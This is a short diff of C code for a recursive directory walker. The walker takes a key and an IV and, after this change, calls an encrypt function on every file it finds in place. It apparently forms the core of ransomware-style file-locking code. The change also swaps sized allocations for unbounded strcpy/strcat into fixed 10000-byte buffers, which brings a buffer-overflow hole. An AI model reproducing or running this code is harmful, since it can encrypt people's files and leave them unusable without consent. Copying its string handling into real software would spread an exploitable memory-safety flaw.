@@ -48,38 +48,27 @@ void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fl
     {
         if(dirp->d_type==DT_DIR && strcmp("..",dirp->d_name) != 0 && strcmp(".",dirp->d_name) != 0 )
         {
-            //printf("%s\n", dirp->d_name);
-            char *newPath = (char*)malloc(strlen(name)+strlen(dirp->d_name)+2);
-            strncat(newPath,name,strlen(name));
-            strncat(newPath,"/",2);
-            strncat(newPath,dirp->d_name,strlen(dirp->d_name));
-            //printf("%s\n", newPath);
+            char newPath[10000];
+            strcpy(newPath,name);
+            strcat(newPath,"/");
+            strcat(newPath,dirp->d_name);
             listdir(newPath,iv, key, 'e');
+            printf("%s\n", newPath);
             
             
             
         }
         else if(strcmp("..",dirp->d_name) != 0 && strcmp(".",dirp->d_name) != 0)
         {
-
-            char *filePath = (char*)malloc(strlen(name)+strlen(dirp->d_name)+2);
-            strncat(filePath,name,strlen(name));
-            strncat(filePath,"/",2);
-            strncat(filePath,dirp->d_name,strlen(dirp->d_name));
+            char filePath[10000] ;
+            strcpy(filePath,name);
+            strcat(filePath,"/");
+            strcat(filePath,dirp->d_name);
             printf("%s\n",filePath);
-            //encrypt(key, iv, filePath);
-            //free(filePath);
+            encrypt(key, iv, filePath);
             
-
-            
-
         }
 
-
-
-
     }
-
-
-
+    closedir(dp);
 }
